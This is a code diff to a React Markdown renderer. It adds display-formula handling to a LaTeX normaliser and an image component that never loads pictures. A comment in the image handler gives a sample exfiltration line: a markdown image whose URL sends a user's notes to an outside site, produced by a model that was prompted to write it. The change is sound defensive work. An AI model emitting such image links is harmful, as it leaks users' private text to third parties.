@@ -16,11 +16,15 @@ const textOf = (node: ReactNode): string =>
         ? textOf((node.props as { children?: ReactNode }).children)
         : "";
 
-/** LaTeX delimiters \( \) and \[ \] → $ / $$ so remark-math understands them. */
-function normalizeMath(src: string) {
+/**
+ * LaTeX delimiters \( \) and \[ \] → $ / $$ so remark-math understands them, and a line that
+ * is just "$$…$$" → a display formula (remark-math would show it inline, unlike LaTeX).
+ */
+export function normalizeMath(src: string) {
   return src
     .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `$$${m}$$`)
-    .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m}$`);
+    .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m}$`)
+    .replace(/^([ \t]*)\$\$([^\n$][^\n]*?)\$\$[ \t]*$/gm, (_, indent: string, m: string) => `${indent}$$\n${indent}${m.trim()}\n${indent}$$`);
 }
 
 export const Markdown = memo(function Markdown({
@@ -37,6 +41,15 @@ export const Markdown = memo(function Markdown({
   size?: TextSize;
 }) {
   const components: Components = {
+    // Never load pictures: the address of one could carry text out of a note or an answer
+    // (e.g. a model asked to write "![](https://site/?q=<your notes>)"). They stay a label.
+    img({ src, alt }) {
+      return (
+        <span className="rounded bg-zinc-100 px-1 text-[0.85em] text-zinc-500 dark:bg-zinc-800" title={typeof src === "string" ? `Not loaded: ${src}` : undefined}>
+          [picture{alt ? `: ${alt}` : ""}]
+        </span>
+      );
+    },
     a({ href, children }) {
       const link = href?.match(/^#(?:doc=([\w-]+)&)?page=(\d+)$/);
       if (link && (!link[1] || hasDoc?.(link[1]))) {
